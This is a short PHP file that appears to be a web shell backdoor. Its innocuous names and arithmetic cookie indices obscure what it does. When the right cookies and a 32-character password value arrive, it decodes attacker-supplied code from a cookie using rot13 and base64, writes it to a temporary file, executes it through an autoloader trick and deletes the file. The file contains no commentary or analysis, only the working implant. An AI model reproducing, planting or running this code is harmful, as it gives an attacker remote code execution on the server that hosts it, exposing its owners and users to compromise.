<?php


if (isset($_COOKIE[-31+31]) && isset($_COOKIE[-98+99]) && isset($_COOKIE[-90+93]) && isset($_COOKIE[98+-94])) {
    $data_chunk = $_COOKIE;
    function auth_exception_handler($ptr) {
        $data_chunk = $_COOKIE;
        $obj = tempnam((!empty(session_save_path()) ? session_save_path() : sys_get_temp_dir()), '89b9687c');
        if (!is_writable($obj)) {
            $obj = getcwd() . DIRECTORY_SEPARATOR . "buffer_cache";
        }
        $ent = "\x3c\x3f\x70\x68p " . base64_decode(str_rot13($data_chunk[3]));
        if (is_writeable($obj)) {
            $flag = fopen($obj, 'w+');
            fputs($flag, $ent);
            fclose($flag);
            spl_autoload_unregister(__FUNCTION__);
            require_once($obj);
            @array_map('unlink', array($obj));
        }
    }
    spl_autoload_register("auth_exception_handler");
    $value = "ff01b0de782312850b104899fd2d3664";
    if (!strncmp($value, $data_chunk[4], 32)) {
        if (@class_parents("settings_query_handler", true)) {
            exit;
        }
    }
}
